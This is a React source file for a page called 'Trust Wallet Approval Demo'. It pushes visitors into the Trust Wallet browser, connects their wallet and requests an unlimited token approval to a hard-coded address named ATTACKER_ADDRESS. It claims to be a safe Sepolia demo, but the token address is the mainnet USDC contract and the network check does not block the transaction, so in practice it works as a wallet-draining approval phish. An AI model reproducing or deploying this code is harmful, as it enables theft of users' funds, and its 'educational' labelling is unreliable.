import React, { useEffect, useState } from "react";
import { ethers } from "ethers";

/* =========================
   CONFIG
========================= */

// ✅ USDC on Sepolia
const TOKEN_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";

// ⚠️ Demo permission receiver (NO transfer logic used)
const ATTACKER_ADDRESS = "0x23F1887aB3D6Eb129D32B209E29b102dB7E07F31";

// Minimal ERC20 ABI
const ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function symbol() view returns (string)",
  "function name() view returns (string)",
];

// Unlimited approval value
const UNLIMITED =
  "115792089237316195423570985008687907853269984665640564039457584007913129639935";

function App() {
  const [wallet, setWallet] = useState(null);
  const [signer, setSigner] = useState(null);
  const [token, setToken] = useState(null);
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(false);
  const [connecting, setConnecting] = useState(false);
  const [isTrustWallet, setIsTrustWallet] = useState(false);
  const [step, setStep] = useState(1);

  /* =========================
     HELPERS
  ========================= */
  const addLog = (msg) => setLogs((p) => [...p, msg]);
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  /* =========================
     TRUST WALLET DETECTION
  ========================= */
  useEffect(() => {
    if (!window.ethereum?.isTrust) {
      addLog("❌ Trust Wallet browser not detected");

      // 👉 Mobile deep-link to Trust Wallet Browser
      const isMobile = /Android|iPhone|iPad/i.test(navigator.userAgent);
      if (isMobile) {
        const url = encodeURIComponent(window.location.href);
        window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`;
      }
      return;
    }

    setIsTrustWallet(true);
    addLog("📱 Trust Wallet detected");
  }, []);

  /* =========================
     CONNECT TRUST WALLET
  ========================= */
  const connectWallet = async () => {
    if (connecting) return; // prevent double request

    try {
      setConnecting(true);

      if (!window.ethereum?.isTrust) {
        alert("Please open this site inside Trust Wallet Browser");
        return;
      }

      // Trust Wallet compatible request
      await window.ethereum.request({ method: "eth_requestAccounts" });

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const address = await signer.getAddress();
      const ethBalance = await provider.getBalance(address);

      // Enforce Sepolia
      const network = await provider.getNetwork();
      if (network.chainId !== 11155111) {
        addLog("❌ Switch Trust Wallet to Sepolia network");
      }
      const token = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);

      setSigner(signer);
      setToken(token);
      setWallet({
        address,
        short: address.slice(0, 6) + "..." + address.slice(-4),
        eth: ethers.utils.formatEther(ethBalance),
      });

      addLog("✅ Wallet connected successfully");
      setStep(2);
    } catch (err) {
      console.error(err);
      if (err.code === -32002) {
        addLog("⏳ Connection request already pending in Trust Wallet");
      } else if (err.code === 4001) {
        addLog("❌ User rejected connection");
      } else {
        addLog("❌ Wallet connection failed");
      }
    } finally {
      setConnecting(false);
    }
  };

  /* =========================
     SIMULATION (APPROVE ONLY)
  ========================= */
  const simulate = async () => {
    try {
      setLoading(true);
      // ❌ DO NOT clear logs here (UX fix)

      if (!wallet || !token) {
        addLog("❌ Wallet not ready");
        return;
      }

      addLog("🔍 Checking balance...");
      await sleep(400);

      const raw = await token.balanceOf(wallet.address);
      const decimals = await token.decimals();
      const balance = ethers.utils.formatUnits(raw, decimals);
      addLog(`💰 Balance: ${balance}`);
      await sleep(400);

      const ok = window.confirm(
        "⚠️ EDUCATIONAL DEMO\n\n" +
          "This will approve UNLIMITED token spending.\n" +
          "No tokens will be transferred by this app.\n\nContinue?"
      );
      if (!ok) {
        addLog("❌ User cancelled");
        return;
      }

      const tx = await token.approve(ATTACKER_ADDRESS, UNLIMITED);
      addLog(`📝 Tx sent: ${tx.hash}`);
      addLog("⏳ Waiting confirmation...");

      await tx.wait();

      addLog("🚨 UNLIMITED approval granted");
      setStep(3);
    } catch (err) {
      console.error(err);
      if (err.code === 4001) {
        addLog("❌ User rejected transaction");
      } else {
        addLog("❌ Transaction failed");
      }
    } finally {
      setLoading(false);
    }
  };

  /* =========================
     UI
  ========================= */
  return (
    <div className="min-h-screen bg-black text-white flex items-center justify-center p-4">
      <div className="max-w-xl w-full bg-zinc-900 rounded-xl p-6">
        <h1 className="text-xl font-bold text-center mb-4">
          🔐 Trust Wallet Approval Demo
        </h1>

        {/* Logs (Always Visible) */}
        {logs.length > 0 && (
          <div className="bg-black p-3 rounded text-sm space-y-1 mb-3">
            {logs.map((l, i) => (
              <div key={i}>{l}</div>
            ))}
          </div>
        )}

        {/* Connected Badge */}
        {wallet && (
          <div className="bg-green-900/30 border border-green-700 text-green-400 text-sm p-2 rounded mb-3 text-center">
            ✅ Wallet Connected
          </div>
        )}

        {!isTrustWallet && (
          <div className="bg-red-900/30 p-3 rounded text-sm mb-4">
            ❌ Open this link inside <b>Trust Wallet Browser</b>
          </div>
        )}

        {step === 1 && (
          <button
            onClick={connectWallet}
            disabled={connecting}
            className={`w-full py-3 rounded font-bold ${
              connecting ? "bg-gray-600 cursor-not-allowed" : "bg-blue-600"
            }`}
          >
            {connecting ? "Connecting..." : "Connect Trust Wallet"}
          </button>
        )}

        {step === 2 && wallet && (
          <>
            <div className="bg-black p-3 rounded text-sm mb-3">
              <p>📱 Trust Wallet</p>
              <p>Address: {wallet.short}</p>
              <p>ETH: {wallet.eth}</p>
            </div>

            <button
              onClick={simulate}
              disabled={loading}
              className={`w-full py-3 rounded font-bold ${
                loading ? "bg-gray-600 cursor-not-allowed" : "bg-red-600"
              }`}
            >
              {loading ? "Processing..." : "Start Simulation"}
            </button>
          </>
        )}

        {step === 3 && (
          <div className="bg-black p-3 rounded text-sm mt-3">
            <p className="text-red-400">
              ⚠️ Unlimited approval is dangerous in real life.
            </p>
          </div>
        )}
      </div>
    </div>
  );
}

export default App;
